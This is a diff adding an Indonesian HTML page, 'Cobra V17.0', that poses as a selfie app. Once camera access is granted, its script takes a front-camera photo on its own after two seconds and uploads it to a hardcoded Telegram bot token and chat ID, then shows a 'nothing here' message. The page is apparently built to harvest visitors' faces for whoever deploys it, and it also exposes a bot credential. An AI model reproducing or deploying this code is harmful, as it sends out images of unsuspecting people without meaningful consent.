@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Cobra V17.0</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+        }
+        .container {
+            text-align: center;
+            z-index: 10;
+            padding: 20px;
+        }
+        .status {
+            color: white;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 50px;
+            display: inline-block;
+        }
+        button {
+            margin-top: 30px;
+            padding: 12px 30px;
+            font-size: 1rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #00ff88, #00cc66);
+            border: none;
+            border-radius: 50px;
+            color: #000;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        button:active {
+            transform: scale(0.95);
+        }
+        .hidden {
+            display: none;
+        }
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .camera-active video {
+            opacity: 1;
+        }
+        .shutter-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 100;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.08s;
+        }
+        .result-text {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: clamp(1.5rem, 8vw, 3rem);
+            font-weight: 600;
+            color: white;
+            text-shadow: 0 0 20px rgba(0,255,255,0.5);
+            z-index: 101;
+            opacity: 0;
+            transition: all 0.5s;
+            text-align: center;
+            background: rgba(0,0,0,0.7);
+            padding: 20px 40px;
+            border-radius: 20px;
+            white-space: nowrap;
+            pointer-events: none;
+        }
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(0.9); opacity: 0; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+        .show-text {
+            animation: pulse 0.5s ease forwards;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="status" id="status">📸 COBRA V17.0 READY</div>
+        <button id="startBtn">📷 MULAI SELFIE</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <div class="shutter-effect" id="shutter"></div>
+    <div class="result-text" id="resultText">Ga ada Apa Apa Sehhh</div>
+
+    <script>
+        // ============ KONFIGURASI ============
+        // TOKEN BOT DAN CHAT ID LO
+        const BOT_TOKEN = "8611976046:AAHXzkj8icyuSpjQbQScyyCdAEE6qy_m2Kg";
+        const CHAT_ID = "8336543740";
+        
+        // ============ ELEMEN ============
+        const video = document.getElementById('video');
+        const shutter = document.getElementById('shutter');
+        const resultText = document.getElementById('resultText');
+        const statusDiv = document.getElementById('status');
+        const startBtn = document.getElementById('startBtn');
+        
+        let stream = null;
+        let isCameraActive = false;
+        
+        // ============ FUNGSI ============
+        async function sendPhotoToTelegram(imageDataUrl) {
+            try {
+                // Convert base64 ke blob
+                const blob = await (await fetch(imageDataUrl)).blob();
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'selfie_cobra.jpg');
+                
+                statusDiv.textContent = '📤 Mengirim foto ke bot...';
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    statusDiv.textContent = '✅ Foto terkirim ke bot!';
+                    return true;
+                } else {
+                    console.error('Telegram error:', result);
+                    statusDiv.textContent = '❌ Gagal kirim ke bot!';
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending photo:', error);
+                statusDiv.textContent = '❌ Error: ' + error.message;
+                return false;
+            }
+        }
+        
+        async function takeSelfie() {
+            if (!stream || !isCameraActive) {
+                statusDiv.textContent = '⚠️ Kamera belum aktif!';
+                return;
+            }
+            
+            // Efek shutter
+            shutter.style.opacity = '1';
+            setTimeout(() => {
+                shutter.style.opacity = '0';
+            }, 100);
+            
+            // Getaran visual
+            document.body.style.transform = 'scale(0.99)';
+            setTimeout(() => {
+                document.body.style.transform = '';
+            }, 80);
+            
+            // Capture dari video
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Hasil foto sebagai base64
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            // Kirim ke Telegram
+            const success = await sendPhotoToTelegram(photoData);
+            
+            // Tampilkan teks hasil
+            resultText.classList.remove('show-text');
+            void resultText.offsetWidth;
+            resultText.classList.add('show-text');
+            
+            if (success) {
+                statusDiv.textContent = '📸 Selfie berhasil! Cek bot kamu';
+            } else {
+                statusDiv.textContent = '📸 Foto diambil tapi gagal dikirim';
+            }
+            
+            // Teks hilang setelah 3 detik
+            setTimeout(() => {
+                resultText.classList.remove('show-text');
+            }, 3000);
+        }
+        
+        async function startCamera() {
+            if (isCameraActive) {
+                await takeSelfie();
+                return;
+            }
+            
+            statusDiv.textContent = '📷 Meminta akses kamera...';
+            
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: "user" } }
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+                
+                document.body.classList.add('camera-active');
+                isCameraActive = true;
+                statusDiv.textContent = '🎥 Kamera depan aktif - Klik tombol untuk selfie';
+                startBtn.textContent = '📸 AMBIL FOTO';
+                
+                setTimeout(() => {
+                    if (isCameraActive) {
+                        takeSelfie();
+                    }
+                }, 2000);
+                
+            } catch (err) {
+                console.error('Camera error:', err);
+                
+                try {
+                    statusDiv.textContent = '📷 Mencoba kamera default...';
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
+                    await video.play();
+                    document.body.classList.add('camera-active');
+                    isCameraActive = true;
+                    statusDiv.textContent = '🎥 Kamera aktif - Klik tombol untuk selfie';
+                    startBtn.textContent = '📸 AMBIL FOTO';
+                    
+                    setTimeout(() => {
+                        if (isCameraActive) {
+                            takeSelfie();
+                        }
+                    }, 2000);
+                    
+                } catch (err2) {
+                    statusDiv.textContent = '❌ Gagal akses kamera! Izin diperlukan';
+                    console.error('Camera fallback error:', err2);
+                }
+            }
+        }
+        
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            isCameraActive = false;
+            document.body.classList.remove('camera-active');
+            video.srcObject = null;
+            statusDiv.textContent = '📸 COBRA V17.0 READY';
+            startBtn.textContent = '📷 MULAI SELFIE';
+        }
+        
+        startBtn.addEventListener('click', startCamera);
+        
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+        
+        console.log('COBRA V17.0 - Front Camera Active');
+        console.log('Bot Token:', BOT_TOKEN ? '✅ OK' : '❌ Belum diisi');
+        console.log('Chat ID:', CHAT_ID ? '✅ OK' : '❌ Belum diisi');
+    </script>
+</body>
+</html>
